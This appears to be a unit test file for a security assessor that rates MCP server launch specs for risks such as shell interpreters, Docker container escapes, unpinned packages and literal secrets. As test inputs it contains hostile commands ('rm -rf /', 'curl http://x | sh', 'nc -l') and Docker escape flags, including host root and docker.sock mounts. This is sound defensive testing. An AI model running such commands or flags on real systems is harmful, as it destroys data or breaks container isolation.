/**
 * Unit tests for `src/security.ts` — the Host-side safety assessor.
 *
 * Run with `node --test test/security.test.mjs` (after `npm run build`, which
 * produces `lib/index.js`). Only public behaviour is asserted: the risk level,
 * the stable finding codes, and the credential/placeholder key lists.
 */
import assert from 'node:assert/strict';
import test from 'node:test';
import { assessSpec, assessSpecs, catalogKeys, createTranslator, messageEntry } from '../lib/index.js';
import { SAMPLES } from './fixtures/samples.mjs';

/** Build a minimal valid stdio spec, overriding only what a case cares about. */
function stdio(overrides = {}) {
  return {
    name: 'test-server',
    transport: 'stdio',
    command: 'node',
    args: ['server.mjs'],
    source: 'paste',
    ...overrides,
  };
}

/** Codes emitted for one spec. */
function codesOf(risk) {
  return (risk.findings ?? []).map((finding) => finding.code);
}

/** One finding by code, or `undefined`. */
function finding(risk, code) {
  return (risk.findings ?? []).find((item) => item.code === code);
}

// ── regression: behaviour that existed before the rewrite ──────────────────

test('regression: trusted npx is a warning only (network), not an acknowledgement gate', () => {
  const risk = assessSpec({
    name: 'fs',
    transport: 'stdio',
    command: 'npx',
    args: ['-y', '@modelcontextprotocol/server-filesystem'],
    source: 'paste',
  });
  assert.equal(risk.level, 'warning');
  assert.equal(risk.installable, true);
  assert.equal(risk.requiresAcknowledgement, false);
  assert.equal(risk.networkAccess, true);
});

test('regression: a bare `node` server has no findings at all', () => {
  const risk = assessSpec(stdio());
  assert.equal(risk.level, 'none');
  assert.equal(risk.requiresAcknowledgement, false);
  assert.equal(risk.installable, true);
  assert.equal(risk.networkAccess, false);
  assert.deepEqual(risk.reasons, []);
  assert.deepEqual(risk.findings, []);
  assert.deepEqual(risk.credentialKeys, []);
  assert.deepEqual(risk.secretValueKeys, []);
  assert.deepEqual(risk.placeholderKeys, []);
});

test('regression: sse transport is blocked', () => {
  const risk = assessSpec({ name: 'sse', transport: 'sse', url: 'https://x.test/sse', source: 'paste' });
  assert.equal(risk.level, 'blocked');
  assert.equal(risk.installable, false);
  assert.ok(codesOf(risk).includes('security.sseUnsupported'));
  // A `blocked` server can never be installed, so no acknowledgement is asked.
  assert.equal(risk.requiresAcknowledgement, false);
});

test('regression: missing command / url are blocked', () => {
  assert.equal(assessSpec({ name: 'empty', transport: 'stdio', source: 'paste' }).level, 'blocked');
  assert.equal(
    assessSpec({ name: 'nourl', transport: 'streamable-http', source: 'paste' }).level,
    'blocked',
  );
});

test('regression: credential key names are surfaced, with a 凭证 reason', () => {
  const risk = assessSpec(
    stdio({
      command: 'npx',
      args: ['-y', '@modelcontextprotocol/server-github'],
      env: { GITHUB_TOKEN: 'secret' },
    }),
  );
  assert.equal(risk.level, 'warning');
  assert.deepEqual(risk.credentialKeys, ['GITHUB_TOKEN']);
  assert.ok(risk.reasons.some((reason) => reason.includes('凭证')));
  // `secret` is far too short to look like a live credential.
  assert.deepEqual(risk.secretValueKeys, []);
});

test('regression: unknown bare command is high risk and needs acknowledgement', () => {
  const risk = assessSpec({ name: 'mystery', transport: 'stdio', command: 'mcp-runner', source: 'paste' });
  assert.equal(risk.level, 'high');
  assert.equal(risk.requiresAcknowledgement, true);
  assert.equal(risk.installable, true);
});

test('regression: rm -rf and shell interpreters stay high risk', () => {
  const dangerous = assessSpec({
    name: 'bad',
    transport: 'stdio',
    command: 'bash',
    args: ['-c', 'rm -rf /tmp/work && npx evil'],
    source: 'paste',
  });
  assert.equal(dangerous.level, 'high');
  assert.ok(dangerous.reasons.some((reason) => reason.includes('rm -rf')));
  assert.ok(codesOf(dangerous).includes('security.shellInterpreter'));
  assert.ok(codesOf(dangerous).includes('security.dangerousRmRf'));
});

test('regression: inline-script runtimes are high risk', () => {
  for (const [command, args] of [
    ['node', ['-e', 'process.exit(0)']],
    ['node', ['--trace-warnings', '--eval', 'process.exit(0)']],
    ['python', ['-c', 'print("ok")']],
    ['python', ['-W', 'ignore', '-c', 'print("ok")']],
    ['bun', ['--eval', 'process.exit(0)']],
    ['deno', ['eval', 'Deno.exit(0)']],
    ['deno', ['--quiet', 'eval', 'Deno.exit(0)']],
  ]) {
    const risk = assessSpec({ name: command, transport: 'stdio', command, args, source: 'paste' });
    assert.equal(risk.level, 'high', `${command} inline scripts should be high risk`);
    assert.equal(risk.requiresAcknowledgement, true);
    assert.ok(codesOf(risk).includes('security.inlineScript'), command);
  }
});

test('regression: plain-HTTP remote is high risk, loopback is a warning', () => {
  const remote = assessSpec({
    name: 'remote',
    transport: 'streamable-http',
    url: 'http://mcp.example.com/mcp',
    source: 'web',
  });
  assert.equal(remote.level, 'high');
  assert.ok(codesOf(remote).includes('security.plainHttpEndpoint'));

  const local = assessSpec({
    name: 'local',
    transport: 'streamable-http',
    url: 'http://127.0.0.1:3000/mcp',
    source: 'web',
  });
  assert.equal(local.level, 'warning');
  assert.equal(local.requiresAcknowledgement, false);
});

test('assessSpecs keeps `__proto__` as an own server-name key', () => {
  const risks = assessSpecs([{ name: '__proto__', transport: 'stdio', command: 'node', source: 'paste' }]);
  assert.equal(Object.getPrototypeOf(risks), Object.prototype);
  assert.equal(Object.hasOwn(risks, '__proto__'), true);
  // `__proto__` is 9 characters of [A-Za-z0-9_-], so it passes the naming rule.
  assert.equal(risks.__proto__.level, 'none');
});

// ── container escape surface ───────────────────────────────────────────────

test('docker: a plain `docker run` stays below high risk', () => {
  const risk = assessSpec(
    stdio({ name: 'docker-plain', command: 'docker', args: ['run', '--rm', 'acme/mcp:1.2.3'] }),
  );
  assert.notEqual(risk.level, 'high');
  assert.equal(risk.requiresAcknowledgement, false);
  assert.deepEqual(codesOf(risk), []);
});

test('docker: --privileged is high risk', () => {
  const risk = assessSpec(
    stdio({ name: 'privileged', command: 'docker', args: ['run', '--privileged', 'acme/mcp'] }),
  );
  assert.equal(risk.level, 'high');
  assert.equal(risk.requiresAcknowledgement, true);
  assert.ok(codesOf(risk).includes('security.dockerPrivileged'));
});

test('docker: mounting the host root is high risk', () => {
  for (const args of [
    ['run', '-v', '/:/host', 'acme/mcp'],
    ['run', '-v', '/:/', 'acme/mcp'],
    ['run', '--volume', '/:/data', 'acme/mcp'],
    ['run', '--mount', 'type=bind,source=/,target=/host', 'acme/mcp'],
  ]) {
    const risk = assessSpec(stdio({ name: 'hostroot', command: 'docker', args }));
    assert.equal(risk.level, 'high', args.join(' '));
    assert.ok(codesOf(risk).includes('security.dockerHostRootMount'), args.join(' '));
  }
});

test('docker: mounting the runtime socket is high risk', () => {
  for (const args of [
    ['run', '-v', '/var/run/docker.sock:/var/run/docker.sock', 'acme/mcp'],
    ['run', '-v', '/run/podman/podman.sock:/tmp/podman.sock', 'acme/mcp'],
    ['run', '--volume=/var/run/docker.sock:/docker.sock', 'acme/mcp'],
  ]) {
    const risk = assessSpec(stdio({ name: 'socket', command: 'podman', args }));
    assert.equal(risk.level, 'high', args.join(' '));
    assert.ok(codesOf(risk).includes('security.dockerSocketMount'), args.join(' '));
  }
});

test('docker: host networking is high risk', () => {
  for (const args of [
    ['run', '--network', 'host', 'acme/mcp'],
    ['run', '--network=host', 'acme/mcp'],
    ['run', '--net=host', 'acme/mcp'],
  ]) {
    const risk = assessSpec(stdio({ name: 'net', command: 'docker', args }));
    assert.equal(risk.level, 'high', args.join(' '));
    assert.ok(codesOf(risk).includes('security.dockerHostNetwork'), args.join(' '));
  }
});

test('docker: sharing a host namespace is high risk', () => {
  for (const args of [
    ['run', '--pid', 'host', 'acme/mcp'],
    ['run', '--ipc=host', 'acme/mcp'],
  ]) {
    const risk = assessSpec(stdio({ name: 'ns', command: 'docker', args }));
    assert.equal(risk.level, 'high', args.join(' '));
    assert.ok(codesOf(risk).includes('security.dockerHostNamespace'), args.join(' '));
  }
});

test('docker: --cap-add is a warning, not an acknowledgement gate', () => {
  const risk = assessSpec(
    stdio({ name: 'cap', command: 'docker', args: ['run', '--cap-add', 'SYS_ADMIN', 'acme/mcp'] }),
  );
  assert.equal(risk.level, 'warning');
  assert.equal(risk.requiresAcknowledgement, false);
  const capped = finding(risk, 'security.dockerCapAdd');
  assert.ok(capped);
  assert.equal(capped.params.cap, 'SYS_ADMIN');
});

test('docker: a benign bind mount is not flagged', () => {
  const risk = assessSpec(
    stdio({ name: 'benign', command: 'docker', args: ['run', '-v', '/work/data:/data', 'acme/mcp'] }),
  );
  assert.notEqual(risk.level, 'high');
  assert.ok(!codesOf(risk).includes('security.dockerHostRootMount'));
});

test('docker: a Windows drive mount is not mistaken for the host root', () => {
  const risk = assessSpec(
    stdio({ name: 'win', command: 'docker', args: ['run', '-v', 'C:\\work:/data', 'acme/mcp'] }),
  );
  assert.ok(!codesOf(risk).includes('security.dockerHostRootMount'));
});

// ── supply chain: version pinning ──────────────────────────────────────────

test('supply chain: an unpinned package is a warning with pkg/tool params', () => {
  for (const [command, args, pkg] of [
    ['npx', ['-y', '@modelcontextprotocol/server-filesystem'], '@modelcontextprotocol/server-filesystem'],
    ['npx', ['--yes', '@acme/mcp@latest'], '@acme/mcp'],
    ['npx', ['-y', 'acme-mcp@next'], 'acme-mcp'],
    ['uvx', ['mcp-server-fetch'], 'mcp-server-fetch'],
    ['bunx', ['acme-mcp'], 'acme-mcp'],
    ['pnpm', ['dlx', 'acme-mcp'], 'acme-mcp'],
    ['npm', ['exec', '--yes', 'acme-mcp'], 'acme-mcp'],
  ]) {
    const risk = assessSpec(stdio({ name: 'unpinned', command, args }));
    assert.equal(risk.level, 'warning', `${command} ${args.join(' ')}`);
    const unpinned = finding(risk, 'security.unpinnedPackage');
    assert.ok(unpinned, `${command} ${args.join(' ')} should report an unpinned package`);
    assert.equal(unpinned.params.pkg, pkg);
    assert.equal(unpinned.params.tool, command);
  }
});

test('supply chain: an exact version pin is not reported', () => {
  for (const args of [
    ['-y', '@modelcontextprotocol/server-filesystem@1.2.3'],
    ['-y', '@acme/mcp@2.0.0-rc.1'],
    ['-y', 'acme-mcp@0.1.0'],
  ]) {
    const risk = assessSpec(stdio({ name: 'pinned', command: 'npx', args }));
    assert.ok(!codesOf(risk).includes('security.unpinnedPackage'), args.join(' '));
    // Still a warning for network access, never a gate.
    assert.equal(risk.level, 'warning');
    assert.equal(risk.requiresAcknowledgement, false);
  }
});

test('supply chain: a local path passed to npx is not treated as a registry package', () => {
  const risk = assessSpec(stdio({ name: 'local', command: 'npx', args: ['-y', './dist/server.mjs'] }));
  assert.ok(!codesOf(risk).includes('security.unpinnedPackage'));
});

// ── literal secret values ──────────────────────────────────────────────────

test('secrets: well-known credential shapes are detected by value', () => {
  // These are shape samples, not credentials. They are assembled at runtime in
  // fixtures/samples.mjs so this repository carries no literal provider token:
  // a real-looking `xoxb-…` line is exactly what GitHub's push protection
  // refuses to accept, and rewriting the samples into an unrecognisable shape
  // would stop them testing anything.
  const values = [
    SAMPLES.anthropic,
    SAMPLES.openaiProject,
    SAMPLES.githubClassic,
    SAMPLES.githubOauth,
    SAMPLES.githubUser,
    SAMPLES.githubFineGrained,
    SAMPLES.slackBot,
    SAMPLES.slackUser,
    SAMPLES.awsAccessKey,
    SAMPLES.awsSessionKey,
    SAMPLES.jwt,
    SAMPLES.bearer,
  ];
  for (const value of values) {
    const risk = assessSpec(stdio({ name: 'secret', env: { SOME_VALUE: value } }));
    assert.deepEqual(risk.secretValueKeys, ['SOME_VALUE'], value);
    assert.equal(risk.level, 'warning', value);
    const literal = finding(risk, 'security.secretLiteral');
    assert.ok(literal, value);
    assert.equal(literal.params.key, 'SOME_VALUE');
    // The value itself must never ride along in params.
    assert.equal(literal.params.value, undefined, value);
    assert.ok(!literal.message.includes(value), 'finding must not echo the secret');
  }
});

test('secrets: a long high-entropy token is detected', () => {
  const token = 'Zx9Qw3Lm7Kp2Rt5Vb8Nc4Hd6Jf1Gg0Ss';
  const risk = assessSpec(stdio({ name: 'rand', env: { API_TOKEN: token } }));
  assert.deepEqual(risk.secretValueKeys, ['API_TOKEN']);
  assert.ok(!JSON.stringify(risk.findings).includes(token));
});

test('secrets: ordinary configuration values are not reported', () => {
  for (const value of ['C:\\work\\data', '/usr/local/share', 'https://mcp.example.com/mcp', 'production', 'utf8', '30']) {
    const risk = assessSpec(stdio({ name: 'plain', env: { SETTING: value } }));
    assert.deepEqual(risk.secretValueKeys, [], value);
  }
});

test('secrets: the wizard hint is added once, listing the key names', () => {
  const risk = assessSpec(
    stdio({
      name: 'wizard',
      env: { GITHUB_TOKEN: SAMPLES.githubClassic, OTHER: SAMPLES.openaiProject },
    }),
  );
  const hints = (risk.findings ?? []).filter((item) => item.code === 'security.secretWizardHint');
  assert.equal(hints.length, 1);
  assert.match(hints[0].params.keys, /GITHUB_TOKEN/);
  assert.ok(hints[0].message.includes('!!js process.env.'));
  assert.deepEqual(risk.secretValueKeys.sort(), ['GITHUB_TOKEN', 'OTHER']);
});

test('secrets: a `!!js` expression is never treated as a literal secret', () => {
  const risk = assessSpec(stdio({ name: 'jsx', env: { GITHUB_TOKEN: '!!js process.env.GITHUB_TOKEN' } }));
  assert.deepEqual(risk.secretValueKeys, []);
  assert.deepEqual(risk.placeholderKeys, []);
});

// ── placeholder values ─────────────────────────────────────────────────────

test('placeholders: unresolved variables are detected in env and headers', () => {
  const risk = assessSpec({
    name: 'placeholder',
    transport: 'streamable-http',
    url: 'https://mcp.example.com/mcp',
    headers: { Authorization: 'Bearer ${DOCS_TOKEN}', 'X-Env': '$env:API_KEY' },
    source: 'web',
  });
  assert.deepEqual(risk.placeholderKeys.sort(), ['Authorization', 'X-Env']);
  assert.equal(risk.level, 'warning');
  const placeholders = (risk.findings ?? []).filter((item) => item.code === 'security.placeholderValue');
  assert.equal(placeholders.length, 2);
  for (const item of placeholders) {
    assert.ok(item.message.includes(item.params.value));
  }
});

test('placeholders: documentation-style stand-ins are detected', () => {
  for (const value of [
    '${MY_TOKEN}',
    '$TOKEN',
    '%GITHUB_TOKEN%',
    '<YOUR_TOKEN>',
    'YOUR_API_KEY',
    'your-token-here',
    'replace-me',
    'REPLACE_ME',
    'changeme',
    'xxxx',
    'TODO',
  ]) {
    const risk = assessSpec(stdio({ name: 'ph', env: { API_KEY: value } }));
    assert.deepEqual(risk.placeholderKeys, ['API_KEY'], value);
    assert.equal(risk.level, 'warning', value);
    assert.ok(codesOf(risk).includes('security.placeholderValue'), value);
  }
});

test('placeholders: a real value is not reported as a placeholder', () => {
  const risk = assessSpec(stdio({ name: 'real', env: { API_KEY: 'a-real-looking-key-value' } }));
  assert.deepEqual(risk.placeholderKeys, []);
});

// ── localization ───────────────────────────────────────────────────────────

test('i18n: findings are localized, and English never contains Chinese', () => {
  const spec = stdio({
    name: 'i18n',
    command: 'docker',
    args: ['run', '--privileged', '-v', '/:/host', 'acme/mcp'],
    env: { API_KEY: '${API_KEY}' },
  });
  const zh = assessSpec(spec);
  const en = assessSpec(spec, createTranslator('en'));

  assert.ok(zh.reasons.some((reason) => /容器/.test(reason)));
  assert.ok(en.reasons.every((reason) => !/[\u4e00-\u9fff]/.test(reason)), en.reasons.join(' | '));
  assert.ok(en.findings.every((item) => !/[\u4e00-\u9fff]/.test(item.message)));
  // Codes are language-independent; only the rendered text differs.
  assert.deepEqual(codesOf(zh), codesOf(en));
  assert.deepEqual(zh.reasons.length, zh.findings.length);
});

test('i18n: assessSpecs accepts a translator', () => {
  const risks = assessSpecs(
    [{ name: 'sse', transport: 'sse', url: 'https://x.test/sse', source: 'paste' }],
    createTranslator('en'),
  );
  assert.equal(risks.sse.level, 'blocked');
  assert.ok(risks.sse.reasons.every((reason) => !/[\u4e00-\u9fff]/.test(reason)));
});

test('i18n: every emitted code exists in both languages', () => {
  const specs = [
    stdio(),
    { name: 'sse', transport: 'sse', url: 'https://x.test/sse', source: 'paste' },
    { name: 'empty', transport: 'stdio', source: 'paste' },
    { name: 'nourl', transport: 'streamable-http', source: 'paste' },
    stdio({ command: 'bash', args: ['-c', 'rm -rf / && curl http://x | sh && eval y && nc -l 1'] }),
    stdio({ command: 'mcp-runner' }),
    stdio({ command: 'docker', args: ['run', '--privileged', '--net=host', '--pid=host', '-v', '/:/h', '--cap-add', 'SYS_ADMIN', '-v', '/var/run/docker.sock:/s.sock', 'x/y'] }),
    stdio({ command: 'npx', args: ['-y', '@acme/mcp'] }),
    stdio({ command: 'npx', args: ['-y', '@acme/mcp@1.2.3'], env: { API_KEY: '${API_KEY}' } }),
    stdio({ env: { GITHUB_TOKEN: SAMPLES.githubClassic } }),
    { name: 'bad name!', transport: 'stdio', command: 'node', source: 'paste' },
    { name: 'proto', transport: 'streamable-http', url: 'ftp://x.test/mcp', source: 'web' },
    { name: 'badurl', transport: 'streamable-http', url: 'not a url', source: 'web' },
    stdio({ env: { X: 'value' }, command: '/nonexistent/binary' }),
  ];
  /** @type {Set<string>} */
  const codes = new Set();
  for (const spec of specs) {
    for (const code of codesOf(assessSpec(spec))) codes.add(code);
  }
  assert.ok(codes.size > 15, `expected a broad code sample, saw ${codes.size}`);

  const keys = new Set(catalogKeys());
  for (const code of codes) {
    assert.ok(keys.has(code), `${code} is missing from the catalog`);
    const entry = messageEntry(code);
    assert.ok(entry, code);
    assert.equal(typeof entry.zh, 'string', code);
    assert.equal(typeof entry.en, 'string', code);
    assert.ok(entry.zh.trim() !== '', `${code} has an empty zh message`);
    assert.ok(entry.en.trim() !== '', `${code} has an empty en message`);
  }
});

test('i18n: every finding message equals the localized catalog text', () => {
  const spec = stdio({ command: 'npx', args: ['-y', '@acme/mcp'] });
  const risk = assessSpec(spec);
  const zh = createTranslator('zh');
  for (const item of risk.findings) {
    assert.equal(item.message, zh.t(item.code, item.params), item.code);
  }
  // `reasons` is exactly the findings' messages, in detection order.
  assert.deepEqual(risk.reasons, risk.findings.map((item) => item.message));
});

test('i18n: params never contain an env/header value for a secret finding', () => {
  const token = SAMPLES.githubClassic;
  const risk = assessSpec(stdio({ env: { GITHUB_TOKEN: token } }));
  const serialized = JSON.stringify(risk.findings);
  assert.ok(!serialized.includes(token));
  assert.ok(serialized.includes('GITHUB_TOKEN'));
});
